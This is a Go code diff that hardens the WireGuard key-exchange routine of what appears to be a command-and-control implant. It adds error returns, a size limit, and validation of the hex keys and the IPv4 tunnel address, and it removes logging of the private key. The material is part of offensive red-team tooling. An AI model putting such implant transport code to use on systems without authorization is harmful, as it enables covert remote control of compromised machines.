@@ -28,6 +28,7 @@ import (
 	"crypto/ed25519"
 	"crypto/sha256"
 	"encoding/binary"
+	"encoding/hex"
 	"errors"
 	"fmt"
 	"io"
@@ -275,7 +276,11 @@ func getSessKeys(address string, port uint16) error {
 		return err
 	}
 
-	wgSessPrivKey, wgSessPubKey, tunAddress = doKeyExchange(keyExchangeConnection)
+	wgSessPrivKey, wgSessPubKey, tunAddress, err = doKeyExchange(keyExchangeConnection)
+	if err != nil {
+		_ = dev.Down()
+		return err
+	}
 
 	// {{if .Config.Debug}}
 	log.Printf("Signaling wg device to go down")
@@ -374,28 +379,44 @@ func bringUpWGInterface(address string, port uint16, implantPrivKey string, serv
 }
 
 // doKeyExchange - Connect to key exchange listener and retrieve new dynamic wg keys
-func doKeyExchange(conn net.Conn) (string, string, string) {
+func doKeyExchange(conn net.Conn) (string, string, string, error) {
 	// {{if .Config.Debug}}
 	log.Printf("Connected to key exchange listener")
 	// {{end}}
 	defer conn.Close()
 
-	// 129 = 64 byte key + 1 byte delimiter + 64 byte key + 1 byte delimiter + 16 byte ip address
-	buff := make([]byte, 146)
-	buffReader := bufio.NewReader(conn)
-
-	_, err := io.ReadFull(buffReader, buff)
+	const maxMessageSize = 256
+	buff, err := io.ReadAll(io.LimitReader(conn, maxMessageSize+1))
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Failed to read wg keys from key exchange listener: %s", err)
 		// {{end}}
+		return "", "", "", fmt.Errorf("read WireGuard key exchange response: %w", err)
+	}
+	if len(buff) > maxMessageSize {
+		return "", "", "", errors.New("WireGuard key exchange response exceeds maximum length")
 	}
 
 	stringSlice := strings.Split(string(buff), "|")
+	if len(stringSlice) != 3 {
+		return "", "", "", fmt.Errorf("invalid WireGuard key exchange response: got %d fields", len(stringSlice))
+	}
+	for index, key := range stringSlice[:2] {
+		if len(key) != 64 {
+			return "", "", "", fmt.Errorf("invalid WireGuard key exchange key %d length", index+1)
+		}
+		if _, err := hex.DecodeString(key); err != nil {
+			return "", "", "", fmt.Errorf("invalid WireGuard key exchange key %d encoding", index+1)
+		}
+	}
+	tunIP, err := netip.ParseAddr(stringSlice[2])
+	if err != nil || !tunIP.Is4() {
+		return "", "", "", fmt.Errorf("invalid WireGuard key exchange tunnel IP %q", stringSlice[2])
+	}
 	// {{if .Config.Debug}}
-	log.Printf("Retrieved new keys, priv:%s, pub:%s, ip:%s", stringSlice[0], stringSlice[1], net.IP(stringSlice[2]).String())
+	log.Printf("Retrieved new WireGuard session keys for tunnel IP %s", tunIP.String())
 	// {{end}}
-	return stringSlice[0], stringSlice[1], net.IP(stringSlice[2]).String()
+	return stringSlice[0], stringSlice[1], tunIP.String(), nil
 }
 
 func getWgKeyExchangePort() int {
